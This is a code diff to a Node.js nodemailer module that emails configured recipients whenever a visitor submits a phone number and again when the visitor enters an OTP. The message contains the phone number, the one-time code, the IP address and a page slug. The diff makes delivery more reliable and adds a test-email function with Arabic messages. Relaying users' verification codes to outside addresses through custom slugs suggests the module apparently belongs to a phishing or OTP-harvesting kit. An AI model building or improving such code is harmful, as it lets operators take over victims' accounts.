@@ -6,7 +6,7 @@ let notificationEmails = [];
 // SMTP transporter (configured lazily when SMTP settings are set)
 let smtpTransporter = null;
 let smtpConfig = {
-    host: '',
+    host: 'smtp.gmail.com',
     port: 587,
     user: '',
     pass: ''
@@ -18,23 +18,41 @@ let smtpConfig = {
 function configureSMTP(config) {
     smtpConfig = { ...smtpConfig, ...config };
 
-    if (!smtpConfig.user || !smtpConfig.pass) {
+    const cleanUser = (smtpConfig.user || '').trim();
+    const cleanPass = (smtpConfig.pass || '').trim().replace(/\s+/g, '');
+
+    if (!cleanUser || !cleanPass) {
         console.log('[EmailNotifier] SMTP not configured yet (missing user/pass).');
         smtpTransporter = null;
         return false;
     }
 
-    smtpTransporter = nodemailer.createTransport({
-        host: smtpConfig.host || 'smtp.gmail.com',
-        port: smtpConfig.port || 587,
-        secure: smtpConfig.port === 465,
-        auth: {
-            user: smtpConfig.user,
-            pass: smtpConfig.pass
-        }
-    });
+    smtpConfig.user = cleanUser;
+    smtpConfig.pass = cleanPass;
 
-    console.log(`[EmailNotifier] SMTP configured: ${smtpConfig.user} via ${smtpConfig.host || 'smtp.gmail.com'}`);
+    const isGmail = (smtpConfig.host || '').includes('gmail');
+
+    if (isGmail) {
+        smtpTransporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: cleanUser,
+                pass: cleanPass
+            }
+        });
+    } else {
+        smtpTransporter = nodemailer.createTransport({
+            host: smtpConfig.host || 'smtp.gmail.com',
+            port: parseInt(smtpConfig.port) || 587,
+            secure: parseInt(smtpConfig.port) === 465,
+            auth: {
+                user: cleanUser,
+                pass: cleanPass
+            }
+        });
+    }
+
+    console.log(`[EmailNotifier] SMTP configured: ${cleanUser} (pass len: ${cleanPass.length}) via ${isGmail ? 'Gmail Service' : smtpConfig.host}`);
     return true;
 }
 
@@ -42,8 +60,8 @@ function configureSMTP(config) {
  * Set notification recipient emails.
  */
 function setNotificationEmails(emails) {
-    notificationEmails = emails.filter(e => e && e.includes('@'));
-    console.log(`[EmailNotifier] Notification emails updated: ${notificationEmails.join(', ') || 'none'}`);
+    notificationEmails = emails.map(e => (e || '').trim()).filter(e => e && e.includes('@'));
+    console.log(`[EmailNotifier] Notification emails updated (${notificationEmails.length}): ${notificationEmails.join(', ') || 'none'}`);
 }
 
 /**
@@ -69,7 +87,14 @@ function getSMTPConfig() {
  * Send email notification when a phone number is submitted.
  */
 async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
-    if (!smtpTransporter || notificationEmails.length === 0) return;
+    if (!smtpTransporter) {
+        console.log('[EmailNotifier] Skipping phone email - SMTP not configured.');
+        return;
+    }
+    if (notificationEmails.length === 0) {
+        console.log('[EmailNotifier] Skipping phone email - No recipient emails saved.');
+        return;
+    }
 
     const timeStr = new Date(submittedAt || Date.now()).toLocaleString('en-US', {
         dateStyle: 'medium', timeStyle: 'short'
@@ -119,6 +144,7 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
         console.log(`[EmailNotifier] Phone notification sent to: ${notificationEmails.join(', ')}`);
     } catch (err) {
         console.error(`[EmailNotifier] Failed to send phone notification:`, err.message);
+        throw err;
     }
 }
 
@@ -126,7 +152,14 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
  * Send email notification when OTP is submitted and verified.
  */
 async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
-    if (!smtpTransporter || notificationEmails.length === 0) return;
+    if (!smtpTransporter) {
+        console.log('[EmailNotifier] Skipping OTP email - SMTP not configured.');
+        return;
+    }
+    if (notificationEmails.length === 0) {
+        console.log('[EmailNotifier] Skipping OTP email - No recipient emails saved.');
+        return;
+    }
 
     const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
         dateStyle: 'medium', timeStyle: 'short'
@@ -182,7 +215,27 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
         console.log(`[EmailNotifier] OTP notification sent to: ${notificationEmails.join(', ')}`);
     } catch (err) {
         console.error(`[EmailNotifier] Failed to send OTP notification:`, err.message);
+        throw err;
     }
+}
+
+/**
+ * Send test email and throw explicit error if something fails.
+ */
+async function sendTestNotification() {
+    if (!smtpTransporter) {
+        throw new Error('لم يتم حفظ إعدادات الـ SMTP! اضغط Save SMTP Config أولاً.');
+    }
+    if (notificationEmails.length === 0) {
+        throw new Error('لم يتم إدخال إيميل المستلم! اكتب إيميلك في Recipients واضغط Save Recipients أولاً.');
+    }
+
+    await notifyPhoneSubmitted({
+        phoneNumber: '+20 100 000 0000 (اختبار الإيميل)',
+        customSlug: '/test',
+        ipAddress: '127.0.0.1',
+        submittedAt: new Date()
+    });
 }
 
 module.exports = {
@@ -191,5 +244,6 @@ module.exports = {
     getNotificationEmails,
     getSMTPConfig,
     notifyPhoneSubmitted,
-    notifyOTPVerified
+    notifyOTPVerified,
+    sendTestNotification
 };
